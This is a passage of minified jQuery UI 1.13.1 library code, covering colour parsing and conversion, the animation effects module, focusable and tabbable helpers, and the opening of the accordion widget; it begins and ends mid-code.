j=this,f=C(c),k=this._rgba=[];return(void 0!==e&&(c=[c,e,h,i],f="array"),"string"===f)?this.parse(E(c)||r._default):"array"===f?(g(d.rgba.props,function(b,a){k[a.idx]=D(c[a.idx],a)}),this):"object"===f?(c instanceof b?g(d,function(b,a){c[a.cache]&&(j[a.cache]=c[a.cache].slice())}):g(d,function(e,d){var b=d.cache;g(d.props,function(a,e){if(!j[b]&&d.to){if("alpha"===a||null==c[a])return;j[b]=d.to(j._rgba)}j[b][e.idx]=D(c[a],e,!0)}),j[b]&&0>a.inArray(null,j[b].slice(0,3))&&(null==j[b][3]&&(j[b][3]=1),d.from&&(j._rgba=d.from(j[b])))}),this):void 0},is:function(a){var e=b(a),c=!0,f=this;return g(d,function(_,a){var b,d=e[a.cache];return d&&(b=f[a.cache]||a.to&&a.to(f._rgba)||[],g(a.props,function(_,a){if(null!=d[a.idx])return c=d[a.idx]===b[a.idx]})),c}),c},_space:function(){var a=[],b=this;return g(d,function(c,d){b[d.cache]&&a.push(c)}),a.pop()},transition:function(h,k){var c=b(h),e=c._space(),a=d[e],f=0===this.alpha()?b("transparent"):this,i=f[a.cache]||a.to(f._rgba),j=i.slice();return c=c[a.cache],g(a.props,function(g,f){var e=f.idx,a=i[e],b=c[e],d=B[f.type]||{};null!==b&&(null===a?j[e]=b:(d.mod&&(b-a>d.mod/2?a+=d.mod:a-b>d.mod/2&&(a-=d.mod)),j[e]=D((b-a)*k+a,f)))}),this[e](j)},blend:function(d){if(1===this._rgba[3])return this;var c=this._rgba.slice(),e=c.pop(),f=b(d)._rgba;return b(a.map(c,function(a,b){return(1-e)*f[b]+e*a}))},toRgbaString:function(){var c="rgba(",b=a.map(this._rgba,function(a,b){return null!=a?a:b>2?1:0});return 1===b[3]&&(b.pop(),c="rgb("),c+b.join()+")"},toHslaString:function(){var c="hsla(",b=a.map(this.hsla(),function(a,b){return null==a&&(a=b>2?1:0),b&&b<3&&(a=Math.round(100*a)+"%"),a});return 1===b[3]&&(b.pop(),c="hsl("),c+b.join()+")"},toHexString:function(c){var b=this._rgba.slice(),d=b.pop();return c&&b.push(~~(255*d)),"#"+a.map(b,function(a){return 1===(a=(a||0).toString(16)).length?"0"+a:a}).join("")},toString:function(){return 0===this._rgba[3]?"transparent":this.toRgbaString()}}),b.fn.parse.prototype=b.fn,d.hsla.to=function(a){if(null==a[0]||null==a[1]||null==a[2])return[null,null,null,a[3]];var i,j,c=a[0]/255,d=a[1]/255,f=a[2]/255,k=a[3],e=Math.max(c,d,f),g=Math.min(c,d,f),b=e-g,h=e+g,l=.5*h;return i=g===e?0:c===e?60*(d-f)/b+360:d===e?60*(f-c)/b+120:60*(c-d)/b+240,j=0===b?0:l<=.5?b/h:b/(2-h),[Math.round(i)%360,j,l,null==k?1:k]},d.hsla.from=function(a){if(null==a[0]||null==a[1]||null==a[2])return[null,null,null,a[3]];var d=a[0]/360,e=a[1],b=a[2],g=a[3],c=b<=.5?b*(1+e):b+e-b*e,f=2*b-c;return[Math.round(255*F(f,c,d+1/3)),Math.round(255*F(f,c,d)),Math.round(255*F(f,c,d-1/3)),g]},g(d,function(c,a){var d=a.props,e=a.cache,f=a.to,h=a.from;b.fn[c]=function(a){if(f&&!this[e]&&(this[e]=f(this._rgba)),void 0===a)return this[e].slice();var i,j=C(a),k="array"===j||"object"===j?a:arguments,c=this[e].slice();return(g(d,function(d,a){var b=k["object"===j?d:a.idx];null==b&&(b=c[a.idx]),c[a.idx]=D(b,a)}),h)?((i=b(h(c)))[e]=c,i):b(c)},g(d,function(a,d){b.fn[a]||(b.fn[a]=function(b){var g,e,h,i,f=C(b);return(e=(g=this[i="alpha"===a?this._hsla?"hsla":"rgba":c]())[d.idx],"undefined"===f)?e:("function"===f&&(f=C(b=b.call(this,e))),null==b&&d.empty)?this:("string"===f&&(h=z.exec(b))&&(b=e+parseFloat(h[2])*("+"===h[1]?1:-1)),g[d.idx]=b,this[i](g))})})}),b.hook=function(c){g(c.split(" "),function(d,c){a.cssHooks[c]={set:function(g,d){var h,e,f="";if("transparent"!==d&&("string"!==C(d)||(h=E(d)))){if(d=b(h||d),!t.rgba&&1!==d._rgba[3]){for(e="backgroundColor"===c?g.parentNode:g;(""===f||"transparent"===f)&&e&&e.style;)try{f=a.css(e,"backgroundColor"),e=e.parentNode}catch(i){}d=d.blend(f&&"transparent"!==f?f:"_default")}d=d.toRgbaString()}try{g.style[c]=d}catch(j){}}},a.fx.step[c]=function(d){d.colorInit||(d.start=b(d.elem,c),d.end=b(d.end),d.colorInit=!0),a.cssHooks[c].set(d.elem,d.start.transition(d.end,d.pos))}})},b.hook("backgroundColor borderBottomColor borderLeftColor borderRightColor borderTopColor color columnRuleColor outlineColor textDecorationColor textEmphasisColor"),a.cssHooks.borderColor={expand:function(b){var a={};return g(["Top","Right","Bottom","Left"],function(d,c){a["border"+c+"Color"]=b}),a}},r=a.Color.names={aqua:"#00ffff",black:"#000000",blue:"#0000ff",fuchsia:"#ff00ff",gray:"#808080",green:"#008000",lime:"#00ff00",maroon:"#800000",navy:"#000080",olive:"#808000",purple:"#800080",red:"#ff0000",silver:"#c0c0c0",teal:"#008080",white:"#ffffff",yellow:"#ffff00",transparent:[null,null,null,0],_default:"#ffffff"};/*!
 * jQuery UI Effects 1.13.1
 * http://jqueryui.com
 *
 * Copyright jQuery Foundation and other contributors
 * Released under the MIT license.
 * http://jquery.org/license
 */ var G="ui-effects-",H="ui-effects-style",I="ui-effects-animated";function J(c,a,b,d){return $.isPlainObject(c)&&(a=c,c=c.effect),c={effect:c},null==a&&(a={}),"function"==typeof a&&(d=a,b=null,a={}),("number"==typeof a||$.fx.speeds[a])&&(d=b,b=a,a={}),"function"==typeof b&&(d=b,b=null),a&&$.extend(c,a),b=b||a.duration,c.duration=$.fx.off?0:"number"==typeof b?b:b in $.fx.speeds?$.fx.speeds[b]:$.fx.speeds._default,c.complete=d||a.complete,c}function K(a){return!a||"number"==typeof a||!!$.fx.speeds[a]||"string"==typeof a&&!$.effects.effect[a]||"function"==typeof a||"object"==typeof a&&!a.effect}function L(e,b){var c=b.outerWidth(),d=b.outerHeight(),a=/^rect\((-?\d*\.?\d*px|-?\d+%|auto),?\s*(-?\d*\.?\d*px|-?\d+%|auto),?\s*(-?\d*\.?\d*px|-?\d+%|auto),?\s*(-?\d*\.?\d*px|-?\d+%|auto)\)$/.exec(e)||["",0,c,d,0];return{top:parseFloat(a[1])||0,right:"auto"===a[2]?c:parseFloat(a[2]),bottom:"auto"===a[3]?d:parseFloat(a[3]),left:parseFloat(a[4])||0}}if($.effects={effect:{}},function(){var b,c,d,e=["add","remove","toggle"],f={border:1,borderBottom:1,borderColor:1,borderLeft:1,borderRight:1,borderTop:1,borderWidth:1,margin:1,padding:1};function g(a){return a.replace(/-([\da-z])/gi,function(b,a){return a.toUpperCase()})}function h(c){var b,d,a=c.ownerDocument.defaultView?c.ownerDocument.defaultView.getComputedStyle(c,null):c.currentStyle,e={};if(a&&a.length&&a[0]&&a[a[0]])for(d=a.length;d--;)b=a[d],"string"==typeof a[b]&&(e[g(b)]=a[b]);else for(b in a)"string"==typeof a[b]&&(e[b]=a[b]);return e}$.each(["borderLeftStyle","borderRightStyle","borderBottomStyle","borderTopStyle"],function(_,b){$.fx.step[b]=function(c){("none"===c.end||c.setAttr)&&(1!==c.pos||c.setAttr)||(a.style(c.elem,b,c.end),c.setAttr=!0)}}),$.fn.addBack||($.fn.addBack=function(a){return this.add(null==a?this.prevObject:this.prevObject.filter(a))}),$.effects.animateClass=function(d,a,b,c){var g=$.speed(a,b,c);return this.queue(function(){var c,b=$(this),i=b.attr("class")||"",a=g.children?b.find("*").addBack():b;a=a.map(function(){return{el:$(this),start:h(this)}}),(c=function(){$.each(e,function(c,a){d[a]&&b[a+"Class"](d[a])})})(),a=a.map(function(){return this.end=h(this.el[0]),this.diff=function(e,c){var a,b,d={};for(a in c)b=c[a],e[a]===b||f[a]|| !$.fx.step[a]&&isNaN(parseFloat(b))||(d[a]=b);return d}(this.start,this.end),this}),b.attr("class",i),a=a.map(function(){var c=this,a=$.Deferred(),b=$.extend({},g,{queue:!1,complete:function(){a.resolve(c)}});return this.el.animate(this.diff,b),a.promise()}),$.when.apply($,a.get()).done(function(){c(),$.each(arguments,function(){var a=this.el;$.each(this.diff,function(b){a.css(b,"")})}),g.complete.call(b[0])})})},$.fn.extend({addClass:(b=$.fn.addClass,function(c,a,d,e){return a?$.effects.animateClass.call(this,{add:c},a,d,e):b.apply(this,arguments)}),removeClass:(c=$.fn.removeClass,function(a,b,d,e){return arguments.length>1?$.effects.animateClass.call(this,{remove:a},b,d,e):c.apply(this,arguments)}),toggleClass:(d=$.fn.toggleClass,function(b,a,c,e,f){return"boolean"!=typeof a&& void 0!==a?$.effects.animateClass.call(this,{toggle:b},a,c,e):c?$.effects.animateClass.call(this,a?{add:b}:{remove:b},c,e,f):d.apply(this,arguments)}),switchClass:function(a,b,c,d,e){return $.effects.animateClass.call(this,{add:b,remove:a},c,d,e)}})}(),$.expr&&$.expr.pseudos&&$.expr.pseudos.animated&&($.expr.pseudos.animated=(i=$.expr.pseudos.animated,function(a){return!!$(a).data(I)||i(a)})),!1!==$.uiBackCompat&&$.extend($.effects,{save:function(c,b){for(var a=0,d=b.length;a<d;a++)null!==b[a]&&c.data(G+b[a],c[0].style[b[a]])},restore:function(c,b){for(var d,a=0,e=b.length;a<e;a++)null!==b[a]&&(d=c.data(G+b[a]),c.css(b[a],d))},setMode:function(b,a){return"toggle"===a&&(a=b.is(":hidden")?"show":"hide"),a},createWrapper:function(a){if(a.parent().is(".ui-effects-wrapper"))return a.parent();var d={width:a.outerWidth(!0),height:a.outerHeight(!0),float:a.css("float")},c=$("<div></div>").addClass("ui-effects-wrapper").css({fontSize:"100%",background:"transparent",border:"none",margin:0,padding:0}),e={width:a.width(),height:a.height()},b=document.activeElement;try{b.id}catch(f){b=document.body}return a.wrap(c),(a[0]===b||$.contains(a[0],b))&&$(b).trigger("focus"),c=a.parent(),"static"===a.css("position")?(c.css({position:"relative"}),a.css({position:"relative"})):($.extend(d,{position:a.css("position"),zIndex:a.css("z-index")}),$.each(["top","left","bottom","right"],function(c,b){d[b]=a.css(b),isNaN(parseInt(d[b],10))&&(d[b]="auto")}),a.css({position:"relative",top:0,left:0,right:"auto",bottom:"auto"})),a.css(e),c.css(d).show()},removeWrapper:function(a){var b=document.activeElement;return a.parent().is(".ui-effects-wrapper")&&(a.parent().replaceWith(a),(a[0]===b||$.contains(a[0],b))&&$(b).trigger("focus")),a}}),$.extend($.effects,{version:"1.13.1",define:function(c,b,a){return a||(a=b,b="effect"),$.effects.effect[c]=a,$.effects.effect[c].mode=b,a},scaledDimensions:function(a,b,c){if(0===b)return{height:0,width:0,outerHeight:0,outerWidth:0};var d="horizontal"!==c?(b||100)/100:1,e="vertical"!==c?(b||100)/100:1;return{height:a.height()*e,width:a.width()*d,outerHeight:a.outerHeight()*e,outerWidth:a.outerWidth()*d}},clipToBox:function(a){return{width:a.clip.right-a.clip.left,height:a.clip.bottom-a.clip.top,left:a.clip.left,top:a.clip.top}},unshift:function(b,c,d){var a=b.queue();c>1&&a.splice.apply(a,[1,0].concat(a.splice(c,d))),b.dequeue()},saveStyle:function(a){a.data(H,a[0].style.cssText)},restoreStyle:function(a){a[0].style.cssText=a.data(H)||"",a.removeData(H)},mode:function(c,a){var b=c.is(":hidden");return"toggle"===a&&(a=b?"show":"hide"),(b?"hide"===a:"show"===a)&&(a="none"),a},getBaseline:function(c,d){var a,b;switch(c[0]){case"top":a=0;break;case"middle":a=.5;break;case"bottom":a=1;break;default:a=c[0]/d.height}switch(c[1]){case"left":b=0;break;case"center":b=.5;break;case"right":b=1;break;default:b=c[1]/d.width}return{x:b,y:a}},createPlaceholder:function(a){var b,c=a.css("position"),d=a.position();return a.css({marginTop:a.css("marginTop"),marginBottom:a.css("marginBottom"),marginLeft:a.css("marginLeft"),marginRight:a.css("marginRight")}).outerWidth(a.outerWidth()).outerHeight(a.outerHeight()),/^(static|relative)/.test(c)&&(c="absolute",b=$("<"+a[0].nodeName+">").insertAfter(a).css({display:/^(inline|ruby)/.test(a.css("display"))?"inline-block":"block",visibility:"hidden",marginTop:a.css("marginTop"),marginBottom:a.css("marginBottom"),marginLeft:a.css("marginLeft"),marginRight:a.css("marginRight"),float:a.css("float")}).outerWidth(a.outerWidth()).outerHeight(a.outerHeight()).addClass("ui-effects-placeholder"),a.data(G+"placeholder",b)),a.css({position:c,left:d.left,top:d.top}),b},removePlaceholder:function(a){var b=G+"placeholder",c=a.data(b);c&&(c.remove(),a.removeData(b))},cleanUp:function(a){$.effects.restoreStyle(a),$.effects.removePlaceholder(a)},setTransition:function(c,b,d,a){return a=a||{},$.each(b,function(f,e){var b=c.cssUnit(e);b[0]>0&&(a[e]=b[0]*d+b[1])}),a}}),$.fn.extend({effect:function(){var a=J.apply(this,arguments),b=$.effects.effect[a.effect],i=b.mode,c=a.queue,d=c||"fx",h=a.complete,e=a.mode,j=[],f=function(c){var b=$(this),a=$.effects.mode(b,e)||i;b.data(I,!0),j.push(a),i&&("show"===a||a===i&&"hide"===a)&&b.show(),i&&"none"===a||$.effects.saveStyle(b),"function"==typeof c&&c()};if($.fx.off||!b)return e?this[e](a.duration,h):this.each(function(){h&&h.call(this)});function g(f){var c=$(this);function d(){"function"==typeof h&&h.call(c[0]),"function"==typeof f&&f()}a.mode=j.shift(),!1===$.uiBackCompat||i?"none"===a.mode?(c[e](),d()):b.call(c[0],a,function(){c.removeData(I),$.effects.cleanUp(c),"hide"===a.mode&&c.hide(),d()}):(c.is(":hidden")?"hide"===e:"show"===e)?(c[e](),d()):b.call(c[0],a,d)}return!1===c?this.each(f).each(g):this.queue(d,f).queue(d,g)},show:(j=$.fn.show,function(b){if(K(b))return j.apply(this,arguments);var a=J.apply(this,arguments);return a.mode="show",this.effect.call(this,a)}),hide:(k=$.fn.hide,function(b){if(K(b))return k.apply(this,arguments);var a=J.apply(this,arguments);return a.mode="hide",this.effect.call(this,a)}),toggle:(l=$.fn.toggle,function(a){if(K(a)||"boolean"==typeof a)return l.apply(this,arguments);var b=J.apply(this,arguments);return b.mode="toggle",this.effect.call(this,b)}),cssUnit:function(a){var c=this.css(a),b=[];return $.each(["em","px","%","pt"],function(d,a){c.indexOf(a)>0&&(b=[parseFloat(c),a])}),b},cssClip:function(a){return a?this.css("clip","rect("+a.top+"px "+a.right+"px "+a.bottom+"px "+a.left+"px)"):L(this.css("clip"),this)},transfer:function(a,l){var c=$(this),b=$(a.to),d="fixed"===b.css("position"),e=$("body"),f=d?e.scrollTop():0,g=d?e.scrollLeft():0,h=b.offset(),j={top:h.top-f,left:h.left-g,height:b.innerHeight(),width:b.innerWidth()},i=c.offset(),k=$("<div class='ui-effects-transfer'></div>");k.appendTo("body").addClass(a.className).css({top:i.top-f,left:i.left-g,height:c.innerHeight(),width:c.innerWidth(),position:d?"fixed":"absolute"}).animate(j,a.duration,a.easing,function(){k.remove(),"function"==typeof l&&l()})}}),$.fx.step.clip=function(a){a.clipInit||(a.start=$(a.elem).cssClip(),"string"==typeof a.end&&(a.end=L(a.end,a.elem)),a.clipInit=!0),$(a.elem).cssClip({top:a.pos*(a.end.top-a.start.top)+a.start.top,right:a.pos*(a.end.right-a.start.right)+a.start.right,bottom:a.pos*(a.end.bottom-a.start.bottom)+a.start.bottom,left:a.pos*(a.end.left-a.start.left)+a.start.left})},e={},$.each(["Quad","Cubic","Quart","Quint","Expo"],function(b,a){e[a]=function(a){return Math.pow(a,b+2)}}),$.extend(e,{Sine:function(a){return 1-Math.cos(a*Math.PI/2)},Circ:function(a){return 1-Math.sqrt(1-a*a)},Elastic:function(a){return 0===a||1===a?a:-Math.pow(2,8*(a-1))*Math.sin(((a-1)*80-7.5)*Math.PI/15)},Back:function(a){return a*a*(3*a-2)},Bounce:function(a){for(var b,c=4;a<((b=Math.pow(2,--c))-1)/11;);return 1/Math.pow(4,3-c)-7.5625*Math.pow((3*b-2)/22-a,2)}}),$.each(e,function(a,b){$.easing["easeIn"+a]=b,$.easing["easeOut"+a]=function(a){return 1-b(1-a)},$.easing["easeInOut"+a]=function(a){return a<.5?b(2*a)/2:1-b(-2*a+2)/2}}),$.effects,$.effects.define("blind","hide",function(b,h){var e={up:["bottom","top"],vertical:["bottom","top"],down:["top","bottom"],left:["right","left"],horizontal:["right","left"],right:["left","right"]},c=$(this),f=b.direction||"up",g=c.cssClip(),a={clip:$.extend({},g)},d=$.effects.createPlaceholder(c);a.clip[e[f][0]]=a.clip[e[f][1]],"show"===b.mode&&(c.cssClip(a.clip),d&&d.css($.effects.clipToBox(a)),a.clip=g),d&&d.animate($.effects.clipToBox(a),b.duration,b.easing),c.animate(a,{queue:!1,duration:b.duration,easing:b.easing,complete:h})}),$.effects.define("bounce",function(d,r){var e,f,k,b=$(this),n=d.mode,g="hide"===n,o="show"===n,h=d.direction||"up",a=d.distance,l=d.times||5,p=2*l+(o||g?1:0),i=d.duration/p,j=d.easing,c="up"===h||"down"===h?"top":"left",m="up"===h||"left"===h,q=0,s=b.queue().length;for($.effects.createPlaceholder(b),k=b.css(c),a||(a=b["top"===c?"outerHeight":"outerWidth"]()/3),o&&((f={opacity:1})[c]=k,b.css("opacity",0).css(c,m?-(2*a):2*a).animate(f,i,j)),g&&(a/=Math.pow(2,l-1)),(f={})[c]=k;q<l;q++)(e={})[c]=(m?"-=":"+=")+a,b.animate(e,i,j).animate(f,i,j),a=g?2*a:a/2;g&&((e={opacity:0})[c]=(m?"-=":"+=")+a,b.animate(e,i,j)),b.queue(r),$.effects.unshift(b,s,p+1)}),$.effects.define("clip","hide",function(b,i){var a,c={},d=$(this),e=b.direction||"vertical",f="both"===e,g=f||"horizontal"===e,h=f||"vertical"===e;a=d.cssClip(),c.clip={top:h?(a.bottom-a.top)/2:a.top,right:g?(a.right-a.left)/2:a.right,bottom:h?(a.bottom-a.top)/2:a.bottom,left:g?(a.right-a.left)/2:a.left},$.effects.createPlaceholder(d),"show"===b.mode&&(d.cssClip(c.clip),c.clip=a),d.animate(c,{queue:!1,duration:b.duration,easing:b.easing,complete:i})}),$.effects.define("drop","hide",function(a,h){var e,c=$(this),i=a.mode,d=a.direction||"left",f="up"===d||"down"===d?"top":"left",g="up"===d||"left"===d?"-=":"+=",b={opacity:0};$.effects.createPlaceholder(c),e=a.distance||c["top"===f?"outerHeight":"outerWidth"](!0)/2,b[f]=g+e,"show"===i&&(c.css(b),b[f]=("+="===g?"-=":"+=")+e,b.opacity=1),c.animate(b,{queue:!1,duration:a.duration,easing:a.easing,complete:h})}),$.effects.define("explode","hide",function(d,p){var a,b,i,j,k,l,g=d.pieces?Math.round(Math.sqrt(d.pieces)):3,m=g,h=$(this),c="show"===d.mode,n=h.show().css("visibility","hidden").offset(),e=Math.ceil(h.outerWidth()/m),f=Math.ceil(h.outerHeight()/g),q=[];function o(){q.push(this),q.length===g*m&&r()}for(a=0;a<g;a++)for(b=0,j=n.top+a*f,l=a-(g-1)/2;b<m;b++)i=n.left+b*e,k=b-(m-1)/2,h.clone().appendTo("body").wrap("<div></div>").css({position:"absolute",visibility:"visible",left:-b*e,top:-a*f}).parent().addClass("ui-effects-explode").css({position:"absolute",overflow:"hidden",width:e,height:f,left:i+(c?k*e:0),top:j+(c?l*f:0),opacity:c?0:1}).animate({left:i+(c?0:k*e),top:j+(c?0:l*f),opacity:c?1:0},d.duration||500,d.easing,o);function r(){h.css({visibility:"visible"}),$(q).remove(),p()}}),$.effects.define("fade","toggle",function(a,c){var b="show"===a.mode;$(this).css("opacity",b?0:1).animate({opacity:b?1:0},{queue:!1,duration:a.duration,easing:a.easing,complete:c})}),$.effects.define("fold","hide",function(a,l){var b=$(this),g=a.mode,f=a.size||15,h=/([0-9]+)%/.exec(f),d=a.horizFirst?["right","bottom"]:["bottom","right"],i=a.duration/2,j=$.effects.createPlaceholder(b),e=b.cssClip(),k={clip:$.extend({},e)},c={clip:$.extend({},e)},m=[e[d[0]],e[d[1]]],n=b.queue().length;h&&(f=parseInt(h[1],10)/100*m["hide"===g?0:1]),k.clip[d[0]]=f,c.clip[d[0]]=f,c.clip[d[1]]=0,"show"===g&&(b.cssClip(c.clip),j&&j.css($.effects.clipToBox(c)),c.clip=e),b.queue(function(b){j&&j.animate($.effects.clipToBox(k),i,a.easing).animate($.effects.clipToBox(c),i,a.easing),b()}).animate(k,i,a.easing).animate(c,i,a.easing).queue(l),$.effects.unshift(b,n,4)}),$.effects.define("highlight","show",function(a,d){var b=$(this),c={backgroundColor:b.css("backgroundColor")};"hide"===a.mode&&(c.opacity=0),$.effects.saveStyle(b),b.css({backgroundImage:"none",backgroundColor:a.color||"#ffff99"}).animate(c,{queue:!1,duration:a.duration,easing:a.easing,complete:d})}),$.effects.define("size",function(f,p){var h,d,m,c=$(this),l=["fontSize"],i=["borderTopWidth","borderBottomWidth","paddingTop","paddingBottom"],j=["borderLeftWidth","borderRightWidth","paddingLeft","paddingRight"],n=f.mode,q="effect"!==n,g=f.scale||"both",o=f.origin||["middle","center"],r=c.css("position"),k=c.position(),e=$.effects.scaledDimensions(c),a=f.from||e,b=f.to||$.effects.scaledDimensions(c,0);$.effects.createPlaceholder(c),"show"===n&&(m=a,a=b,b=m),d={from:{y:a.height/e.height,x:a.width/e.width},to:{y:b.height/e.height,x:b.width/e.width}},("box"===g||"both"===g)&&(d.from.y!==d.to.y&&(a=$.effects.setTransition(c,i,d.from.y,a),b=$.effects.setTransition(c,i,d.to.y,b)),d.from.x!==d.to.x&&(a=$.effects.setTransition(c,j,d.from.x,a),b=$.effects.setTransition(c,j,d.to.x,b))),("content"===g||"both"===g)&&d.from.y!==d.to.y&&(a=$.effects.setTransition(c,l,d.from.y,a),b=$.effects.setTransition(c,l,d.to.y,b)),o&&(h=$.effects.getBaseline(o,e),a.top=(e.outerHeight-a.outerHeight)*h.y+k.top,a.left=(e.outerWidth-a.outerWidth)*h.x+k.left,b.top=(e.outerHeight-b.outerHeight)*h.y+k.top,b.left=(e.outerWidth-b.outerWidth)*h.x+k.left),delete a.outerHeight,delete a.outerWidth,c.css(a),("content"===g||"both"===g)&&(i=i.concat(["marginTop","marginBottom"]).concat(l),j=j.concat(["marginLeft","marginRight"]),c.find("*[width]").each(function(){var a=$(this),b=$.effects.scaledDimensions(a),c={height:b.height*d.from.y,width:b.width*d.from.x,outerHeight:b.outerHeight*d.from.y,outerWidth:b.outerWidth*d.from.x},e={height:b.height*d.to.y,width:b.width*d.to.x,outerHeight:b.height*d.to.y,outerWidth:b.width*d.to.x};d.from.y!==d.to.y&&(c=$.effects.setTransition(a,i,d.from.y,c),e=$.effects.setTransition(a,i,d.to.y,e)),d.from.x!==d.to.x&&(c=$.effects.setTransition(a,j,d.from.x,c),e=$.effects.setTransition(a,j,d.to.x,e)),q&&$.effects.saveStyle(a),a.css(c),a.animate(e,f.duration,f.easing,function(){q&&$.effects.restoreStyle(a)})})),c.animate(b,{queue:!1,duration:f.duration,easing:f.easing,complete:function(){var d=c.offset();0===b.opacity&&c.css("opacity",a.opacity),q||(c.css("position","static"===r?"relative":r).offset(d),$.effects.saveStyle(c)),p()}})}),$.effects.define("scale",function(a,d){var c=$(this),e=a.mode,f=parseInt(a.percent,10)||(0===parseInt(a.percent,10)?0:"effect"!==e?0:100),b=$.extend(!0,{from:$.effects.scaledDimensions(c),to:$.effects.scaledDimensions(c,f,a.direction||"both"),origin:a.origin||["middle","center"]},a);a.fade&&(b.from.opacity=1,b.to.opacity=0),$.effects.effect.size.call(this,b,d)}),$.effects.define("puff","hide",function(a,b){var c=$.extend(!0,{},a,{fade:!0,percent:parseInt(a.percent,10)||150});$.effects.effect.scale.call(this,c,b)}),$.effects.define("pulsate","show",function(b,i){var a=$(this),e=b.mode,f="show"===e,d=2*(b.times||5)+(f||"hide"===e?1:0),g=b.duration/d,c=0,h=1,j=a.queue().length;for((f||!a.is(":visible"))&&(a.css("opacity",0).show(),c=1);h<d;h++)a.animate({opacity:c},g,b.easing),c=1-c;a.animate({opacity:c},g,b.easing),a.queue(i),$.effects.unshift(a,j,d+1)}),$.effects.define("shake",function(a,n){var j=1,b=$(this),d=a.direction||"left",e=a.distance||20,k=a.times||3,l=2*k+1,c=Math.round(a.duration/l),f="up"===d||"down"===d?"top":"left",g="up"===d||"left"===d,h={},i={},m={},o=b.queue().length;for($.effects.createPlaceholder(b),h[f]=(g?"-=":"+=")+e,i[f]=(g?"+=":"-=")+2*e,m[f]=(g?"-=":"+=")+2*e,b.animate(h,c,a.easing);j<k;j++)b.animate(i,c,a.easing).animate(m,c,a.easing);b.animate(i,c,a.easing).animate(h,c/2,a.easing).queue(n),$.effects.unshift(b,o,l+1)}),$.effects.define("slide","show",function(e,i){var g,f,b=$(this),h={up:["bottom","top"],down:["top","bottom"],left:["right","left"],right:["left","right"]},j=e.mode,c=e.direction||"left",d="up"===c||"down"===c?"top":"left",k=e.distance||b["top"===d?"outerHeight":"outerWidth"](!0),a={};$.effects.createPlaceholder(b),g=b.cssClip(),f=b.position()[d],a[d]=("up"===c||"left"===c?-1:1)*k+f,a.clip=b.cssClip(),a.clip[h[c][1]]=a.clip[h[c][0]],"show"===j&&(b.cssClip(a.clip),b.css(d,a[d]),a.clip=g,a[d]=f),b.animate(a,{queue:!1,duration:e.duration,easing:e.easing,complete:i})}),!1!==$.uiBackCompat&&$.effects.define("transfer",function(a,b){$(this).transfer(a,b)}),/*!
 * jQuery UI Focusable 1.13.1
 * http://jqueryui.com
 *
 * Copyright jQuery Foundation and other contributors
 * Released under the MIT license.
 * http://jquery.org/license
 */ $.ui.focusable=function(a,h){var e,c,f,b,g,d=a.nodeName.toLowerCase();return"area"===d?(c=(e=a.parentNode).name,!!a.href&&!!c&&"map"===e.nodeName.toLowerCase()&&(f=$("img[usemap='#"+c+"']")).length>0&&f.is(":visible")):(/^(input|select|textarea|button|object)$/.test(d)?(b=!a.disabled)&&(g=$(a).closest("fieldset")[0])&&(b=!g.disabled):b="a"===d&&a.href||h,b&&$(a).is(":visible")&&function(a){for(var b=a.css("visibility");"inherit"===b;)b=(a=a.parent()).css("visibility");return"visible"===b}($(a)))},$.extend($.expr.pseudos,{focusable:function(a){return $.ui.focusable(a,null!=$.attr(a,"tabindex"))}}),$.ui.focusable,$.fn._form=function(){return"string"==typeof this[0].form?this.closest("form"):$(this[0].form)},$.ui.formResetMixin={_formResetHandler:function(){var a=$(this);setTimeout(function(){var b=a.data("ui-form-reset-instances");$.each(b,function(){this.refresh()})})},_bindFormResetHandler:function(){if(this.form=this.element._form(),this.form.length){var a=this.form.data("ui-form-reset-instances")||[];a.length||this.form.on("reset.ui-form-reset",this._formResetHandler),a.push(this),this.form.data("ui-form-reset-instances",a)}},_unbindFormResetHandler:function(){if(this.form.length){var a=this.form.data("ui-form-reset-instances");a.splice($.inArray(this,a),1),a.length?this.form.data("ui-form-reset-instances",a):this.form.removeData("ui-form-reset-instances").off("reset.ui-form-reset")}}},$.expr.pseudos||($.expr.pseudos=$.expr[":"]),$.uniqueSort||($.uniqueSort=$.unique),!$.escapeSelector){var M=/([\0-\x1f\x7f]|^-?\d)|^-$|[^\x80-\uFFFF\w-]/g,N=function(a,b){return b?"\0"===a?"\uFFFD":a.slice(0,-1)+"\\"+a.charCodeAt(a.length-1).toString(16)+" ":"\\"+a};$.escapeSelector=function(a){return(a+"").replace(M,N)}}$.fn.even&&$.fn.odd||$.fn.extend({even:function(){return this.filter(function(a){return a%2==0})},odd:function(){return this.filter(function(a){return a%2==1})}}),$.ui.keyCode={BACKSPACE:8,COMMA:188,DELETE:46,DOWN:40,END:35,ENTER:13,ESCAPE:27,HOME:36,LEFT:37,PAGE_DOWN:34,PAGE_UP:33,PERIOD:190,RIGHT:39,SPACE:32,TAB:9,UP:38},$.fn.labels=function(){var b,c,d,a,e;return this.length?this[0].labels&&this[0].labels.length?this.pushStack(this[0].labels):(a=this.eq(0).parents("label"),(d=this.attr("id"))&&(e=(b=this.eq(0).parents().last()).add(b.length?b.siblings():this.siblings()),c="label[for='"+$.escapeSelector(d)+"']",a=a.add(e.find(c).addBack(c))),this.pushStack(a)):this.pushStack([])},$.fn.scrollParent=function(c){var a=this.css("position"),d="absolute"===a,e=c?/(auto|scroll|hidden)/:/(auto|scroll)/,b=this.parents().filter(function(){var a=$(this);return(!d||"static"!==a.css("position"))&&e.test(a.css("overflow")+a.css("overflow-y")+a.css("overflow-x"))}).eq(0);return"fixed"!==a&&b.length?b:$(this[0].ownerDocument||document)},$.extend($.expr.pseudos,{tabbable:function(a){var b=$.attr(a,"tabindex"),c=null!=b;return(!c||b>=0)&&$.ui.focusable(a,c)}}),$.fn.extend({uniqueId:(m=0,function(){return this.each(function(){this.id||(this.id="ui-id-"+ ++m)})}),removeUniqueId:function(){return this.each(function(){/^ui-id-\d+$/.test(this.id)&&$(this).removeAttr("id")})}}),$.widget("ui.accordion",{version:"1.13.1",options:{active:0,animate:{},classes:{"ui-accordion-header":"ui-corner-top","ui-accordion-header-collapsed":"ui-corner-all","ui-accordion-content":"ui-corner-bottom"},collapsible:!1,event:"click",header:function(a){return a.find("> li > :first-child").add(a.find("> :not(li)").even())},heightStyle:"auto",icons:{activeHeader:"ui-icon-triangle-1-s",header:"ui-icon-triangle-1-e"},activate:null,beforeActivate:null},hideProps:{borderTopWidth:"hide",borderBottomWidth:"hide",paddingTop:"hide",paddingBottom:"hide",height:"hide"},showProps:{borderTopWidth:"show",borderBottomWidth:"show",paddingTop:"show",paddingBottom:"show",height:"show"},_create:function(){var a=this.options;this.prevShow=this.prevHide=$(),this._addClass("ui-accordion","ui-widget 